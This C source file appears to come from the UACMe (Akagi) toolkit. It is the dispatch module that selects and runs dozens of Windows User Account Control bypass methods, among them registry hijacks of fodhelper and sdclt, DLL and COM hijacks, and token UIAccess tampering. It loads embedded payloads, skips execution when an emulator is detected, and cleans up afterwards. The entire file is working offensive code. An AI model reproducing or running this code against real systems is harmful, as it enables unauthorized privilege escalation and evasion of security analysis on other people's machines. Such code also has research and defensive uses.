/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2024
*
*  TITLE:       METHODS.C
*
*  VERSION:     3.66
*
*  DATE:        03 Apr 2024
*
*  UAC bypass dispatch.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

UCM_API(MethodTest);
UCM_API(MethodSXS);
UCM_API(MethodDism);
UCM_API(MethodWow64Logger);
UCM_API(MethodUiAccess);
UCM_API(MethodMsSettings);
UCM_API(MethodTyranid);
UCM_API(MethodJunction);
UCM_API(MethodSXSDccw);
UCM_API(MethodHakril);
UCM_API(MethodCorProfiler);
UCM_API(MethodCMLuaUtil);
UCM_API(MethodDccwCOM);
UCM_API(MethodDirectoryMock);
UCM_API(MethodShellSdctl);
UCM_API(MethodTokenModUIAccess);
UCM_API(MethodEditionUpgradeManager);
UCM_API(MethodDebugObject);
UCM_API(MethodShellChangePk);
UCM_API(MethodNICPoison);
UCM_API(MethodDeprecated);
UCM_API(MethodIeAddOnInstall);
UCM_API(MethodWscActionProtocol);
UCM_API(MethodFwCplLua2);
UCM_API(MethodProtocolHijack);
UCM_API(MethodPca);
UCM_API(MethodCurVer);
UCM_API(MethodMsdt);
UCM_API(MethodDotNetSerial);
UCM_API(MethodVFServerTaskSched);
UCM_API(MethodVFServerDiagProf);
UCM_API(MethodIscsiCpl);
UCM_API(MethodAtlHijack);
UCM_API(MethodSspiDatagram);

ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
    UacMethodWow64Logger,
    UacMethodEditionUpgradeMgr,
    UacMethodNICPoison,
    UacMethodIeAddOnInstall,
    UacMethodWscActionProtocol,
    UacMethodFwCplLua2,
    UacMethodMsSettingsProtocol,
    UacMethodMsStoreProtocol,
    UacMethodPca,
    UacMethodCurVer,
    UacMethodVFServerTaskSched,
    UacMethodVFServerDiagProf,
    UacMethodAtlHijack,
    UacMethodSspiDatagram
};

UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
    { MethodTest, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodSXS, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodDism, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodWow64Logger, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodUiAccess, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodMsSettings, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodTyranid, { NT_WIN8_BLUE, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodJunction, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSXSDccw, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodHakril, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, FALSE, TRUE },
    { MethodCorProfiler, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodCMLuaUtil, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDccwCOM, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, TRUE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDirectoryMock, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodShellSdctl, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodTokenModUIAccess, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodEditionUpgradeManager, { NT_WIN10_REDSTONE1, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodDebugObject, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodShellChangePk, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodMsSettings, { NT_WIN10_REDSTONE4, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodIeAddOnInstall, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodWscActionProtocol, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodFwCplLua2, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodProtocolHijack, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodProtocolHijack, { NT_WIN10_REDSTONE5, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodPca, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
    { MethodDotNetSerial, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodVFServerTaskSched, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
    { MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
    { MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
    { MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSspiDatagram, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
    { MethodTokenModUIAccess, { NT_WIN10_19H1, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
};

/*
* IsMethodImplementedForWin32
*
* Purpose:
*
* Check if method implemented in win32 version.
*
*/
__forceinline BOOL IsMethodImplementedForWin32(
    _In_ UCM_METHOD Method)
{
    UINT i;
    for (i = 0; i < RTL_NUMBER_OF(UCM_WIN32_NOT_IMPLEMENTED); i++)
        if (UCM_WIN32_NOT_IMPLEMENTED[i] == (ULONG)Method)
            return FALSE;
    return TRUE;
}

/*
* IsMethodMatchRequirements
*
* Purpose:
*
* Check system requirements of the given method.
*
*/
NTSTATUS IsMethodMatchRequirements(
    _In_ PUCM_API_DISPATCH_ENTRY Entry
)
{
#ifdef _DEBUG
    UNREFERENCED_PARAMETER(Entry);
#else
    //
    //  Check Wow64 flags first. Disable this check for debugging build.
    //
    if (g_ctx->IsWow64) {
        if (Entry->DisallowWow64) {
            return STATUS_NOT_SUPPORTED;
        }
    }
#ifdef _WIN64
    else {
        //
        // Not required if Win32.
        //
        if (Entry->Win32OrWow64Required != FALSE) {
            return STATUS_NOT_SUPPORTED;
        }
    }
#endif //_WIN64

    //
    //  Check availability. Disable this check for debugging build.
    //
    if (g_ctx->dwBuildNumber < Entry->Availability.MinumumWindowsBuildRequired) {
        return STATUS_NOT_SUPPORTED;
    }
    if (g_ctx->dwBuildNumber >= Entry->Availability.MinimumExpectedFixedWindowsBuild) {
        return STATUS_NOT_SUPPORTED;
    }
#endif
    return STATUS_SUCCESS;
}

/*
* PostCleanupAttempt
*
* Purpose:
*
* Attempt to cleanup left overs.
*
*/
VOID PostCleanupAttempt(
    _In_ UCM_METHOD Method
)
{
    switch (Method) {

    case UacMethodDISM:
    case UacMethodJunction:
        ucmDismMethodCleanup();
        break;

    case UacMethodWow64Logger:
    case UacMethodVFServerDiagProf:
        ucmMethodCleanupSingleItemSystem32(WOW64LOG_DLL, NULL);
        break;

    case UacMethodSXSConsent:
        ucmSXSMethodCleanup();
        break;

    case UacMethodSXSDccw:
        ucmSXSDccwMethodCleanup();
        break;

    case UacMethodHakril:
        ucmHakrilMethodCleanup();
        break;

    case UacMethodIscsiCpl:
        ucmIscsiCplMethodCleanup();
        break;

    case UacMethodAtlHijack:
        ucmMethodCleanupSingleItemSystem32(ATL_DLL, WBEM_DIR);
        break;

    default:
        break;

    }

    ucmConsolePrintValueUlong(TEXT("[+] PostCleanupAttempt for method"), (ULONG)Method, FALSE);
}

/*
* MethodsManagerCall
*
* Purpose:
*
* Run method by method id.
*
*/
NTSTATUS MethodsManagerCall(
    _In_ UCM_METHOD Method
)
{
    BOOL        bParametersBlockSet = FALSE;
    NTSTATUS    MethodResult, Status;
    ULONG       PayloadSize = 0, DataSize = 0;
    PVOID       PayloadCode = NULL, Resource = NULL;
    PVOID       ImageBaseAddress = g_hInstance;

    PUCM_API_DISPATCH_ENTRY Entry;

    UCM_PARAMS_BLOCK ParamsBlock;

    if (wdIsEmulatorPresent3()) {
        return STATUS_NOT_SUPPORTED;
    }

    if (Method >= UacMethodMax) {
        return STATUS_INVALID_PARAMETER;
    }

    //
    // Is method implemented for Win32?
    //
#ifndef _WIN64
    if (!IsMethodImplementedForWin32(Method)) {
        return STATUS_NOT_SUPPORTED;
    }
#endif //_WIN64

#pragma warning(push)
#pragma warning(disable:33010) //BS disable.
    Entry = &ucmMethodsDispatchTable[Method];
#pragma warning(pop)

    Status = IsMethodMatchRequirements(Entry);
    if (!NT_SUCCESS(Status))
        return Status;

    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Method"), Method, FALSE);
    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Entry->PayloadResourceId"), Entry->PayloadResourceId, TRUE);

    if (Entry->PayloadResourceId != PAYLOAD_ID_NONE) {

        Status = supLdrQueryResourceDataEx(
            Entry->PayloadResourceId,
            ImageBaseAddress,
            &DataSize,
            &Resource);

        if (!NT_SUCCESS(Status)) {

            if (Status == STATUS_RESOURCE_TYPE_NOT_FOUND)
                return STATUS_INVALID_IMAGE_FORMAT;

            return Status;
        }

        if (DataSize == 0 || Resource == NULL) {
            return STATUS_INVALID_IMAGE_FORMAT;
        }

        PayloadCode = g_ctx->DecompressRoutine(Entry->PayloadResourceId, Resource, DataSize, &PayloadSize);

        if ((PayloadCode == NULL) || (PayloadSize == 0)) {
            return STATUS_DATA_ERROR;
        }
    }

    ParamsBlock.Method = Method;
    ParamsBlock.PayloadCode = PayloadCode;
    ParamsBlock.PayloadSize = PayloadSize;

    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Entry->SetParameters"), Entry->SetParameters, FALSE);

    //
    // Set shared parameters.
    //
    //   1. Execution parameters (flag, session id, winstation\desktop)
    //   2. Optional parameter from Akagi command line.
    //
    if (Entry->SetParameters) {
        bParametersBlockSet = supCreateSharedParametersBlock(g_ctx);
        ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->bParametersBlockSet"), bParametersBlockSet, FALSE);
    }

    MethodResult = Entry->Routine(&ParamsBlock);

    if (PayloadCode) {
        RtlSecureZeroMemory(PayloadCode, PayloadSize);
        supVirtualFree(PayloadCode, NULL);
    }

    //
    // Wait a little bit for completion.
    //
    if (Entry->SetParameters) {
        if (bParametersBlockSet) {
            Status = supWaitForGlobalCompletionEvent();
            ucmConsolePrintStatus(TEXT("[+] MethodsManagerCall->supWaitForGlobalCompletionEvent"), Status);
            supDestroySharedParametersBlock(g_ctx);
        }
    }

    PostCleanupAttempt(Method);

    return MethodResult;
}

/************************************************************
**
**
**
** Method table wrappers
**
**
**
************************************************************/

UCM_API(MethodDeprecated)
{
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
}

UCM_API(MethodTest)
{
#ifdef _DEBUG
    return ucmTestRoutine(Parameter->PayloadCode, Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return TRUE;
#endif
}

UCM_API(MethodSXS)
{
    return ucmSXSMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize,
        NULL,
        CONSENT_EXE,
        MSCONFIG_EXE,
        TRUE);
}

UCM_API(MethodDism)
{
    return ucmDismMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodWow64Logger)
{
    //
    //  Required x64 as this method abuse wow64 logger mechanism
    //
#ifdef _WIN64
    return ucmWow64LoggerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodUiAccess)
{
    return ucmUiAccessMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodMsSettings)
{
    LPWSTR lpszPayload = NULL;
    LPWSTR lpszTargetApp = NULL;

    WCHAR szTargetApp[MAX_PATH * 2];

    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    if (Parameter->Method == UacMethodMsSettings2)
        lpszTargetApp = COMPUTERDEFAULTS_EXE;
    else
        lpszTargetApp = FODHELPER_EXE;

    _strcpy(szTargetApp, g_ctx->szSystemDirectory);
    _strcat(szTargetApp, lpszTargetApp);

    return ucmShellRegModMethod(Parameter->Method,
        T_MSSETTINGS,
        szTargetApp,
        lpszPayload);
}

UCM_API(MethodTyranid)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDiskCleanupEnvironmentVariable(lpszPayload);
}

UCM_API(MethodJunction)
{
    return ucmJunctionMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodSXSDccw)
{
    return ucmSXSDccwMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodHakril)
{
    return ucmHakrilMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodCorProfiler)
{
    return ucmCorProfilerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodCMLuaUtil)
{
    LPWSTR lpszParameter;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszParameter = g_ctx->szDefaultPayload;
    else
        lpszParameter = g_ctx->szOptionalParameter;

    return ucmCMLuaUtilShellExecMethod(lpszParameter);
}

UCM_API(MethodDccwCOM)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDccwCOMMethod(lpszPayload);
}

UCM_API(MethodDirectoryMock)
{
    return ucmDirectoryMockMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodShellSdctl)
{
    LPWSTR Payload = NULL;

    if (g_ctx->OptionalParameterLength == 0)
        Payload = g_ctx->szDefaultPayload;
    else
        Payload = g_ctx->szOptionalParameter;

    return ucmShellRegModMethod(Parameter->Method,
        T_CLASSESFOLDER,
        SDCLT_EXE,
        Payload);
}

UCM_API(MethodTokenModUIAccess)
{
    if (Parameter->Method == UacMethodTokenModUiAccess) {
        return ucmTokenModUIAccessMethod(Parameter->PayloadCode,
            Parameter->PayloadSize);
    }
    else {
        return ucmTokenModUIAccessMethod2(Parameter->PayloadCode,
            Parameter->PayloadSize);
    }
}

UCM_API(MethodEditionUpgradeManager)
{
#ifndef _WIN64
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    return ucmEditionUpgradeManagerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#endif
}

UCM_API(MethodDebugObject)
{
    LPWSTR lpszPayload = NULL;
    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDebugObjectMethod(lpszPayload);
}

UCM_API(MethodShellChangePk)
{
    LPWSTR lpszPayload = NULL;

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmShellRegModMethod(Parameter->Method,
        T_LAUNCHERSYSTEMSETTINGS,
        SLUI_EXE,
        lpszPayload);
}

UCM_API(MethodNICPoison)
{
#ifndef _WIN64
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    if (Parameter->Method == UacMethodNICPoison) {

        return ucmNICPoisonMethod(
            Parameter->PayloadCode,
            Parameter->PayloadSize);

    }
    else if (Parameter->Method == UacMethodNICPoison2) {

        return ucmNICPoisonMethod2(
            Parameter->PayloadCode,
            Parameter->PayloadSize);

    }
    else 
        return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodIeAddOnInstall)
{
#ifdef _WIN64
    return ucmIeAddOnInstallMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodWscActionProtocol)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmWscActionProtocolMethod(lpszPayload);
}

UCM_API(MethodFwCplLua2)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmFwCplLuaMethod2(lpszPayload);
}

UCM_API(MethodProtocolHijack)
{
    NTSTATUS Result = STATUS_ACCESS_DENIED;
    LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
    SIZE_T Size;

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        PayloadParameter = g_ctx->szDefaultPayload;
    else
        PayloadParameter = g_ctx->szOptionalParameter;

    switch (Parameter->Method) {
    
    case UacMethodMsSettingsProtocol:
        Result = ucmMsSettingsProtocolMethod(PayloadParameter);
        break;
    
    case UacMethodMsStoreProtocol:

        Size = ((MAX_PATH * 2) + _strlen(PayloadParameter)) * sizeof(WCHAR);
        PayloadFinal = supHeapAlloc(Size);
        if (PayloadFinal) {

            _strcpy(PayloadFinal, g_ctx->szSystemDirectory);
            _strcat(PayloadFinal, CMD_EXE);
            _strcat(PayloadFinal, RUN_CMD_COMMAND);
            _strcat(PayloadFinal, PayloadParameter);
            Result = ucmMsStoreProtocolMethod(PayloadFinal);
            supHeapFree(PayloadFinal);
        }
        break;

    }

    return Result;
}

UCM_API(MethodPca)
{
#ifndef _WIN64
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    return ucmPcaMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#endif
}

UCM_API(MethodCurVer)
{
    UNREFERENCED_PARAMETER(Parameter);
#ifndef _WIN64
    return STATUS_NOT_SUPPORTED;
#else
    LPWSTR lpszPayload = NULL;
    LPWSTR lpszTargetApp = NULL;

    WCHAR szTargetApp[MAX_PATH * 2];

    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    lpszTargetApp = FODHELPER_EXE;
    _strcpy(szTargetApp, g_ctx->szSystemDirectory);
    _strcat(szTargetApp, lpszTargetApp);

    return ucmShellRegModMethod3(T_MSSETTINGS,
        szTargetApp,
        lpszPayload);

#endif
}

UCM_API(MethodMsdt)
{
    return ucmMsdtMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodDotNetSerial)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDotNetSerialMethod(lpszPayload);
}

UCM_API(MethodVFServerTaskSched)
{
    return ucmVFServerTaskSchedMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodVFServerDiagProf)
{
    return ucmVFServerDiagProfileMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodIscsiCpl)
{
    return ucmIscsiCplMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodAtlHijack)
{
    return ucmAtlHijackMethod(MMC_EXE,
        ATL_DLL,
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodSspiDatagram)
{
    return ucmSspiDatagramMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}
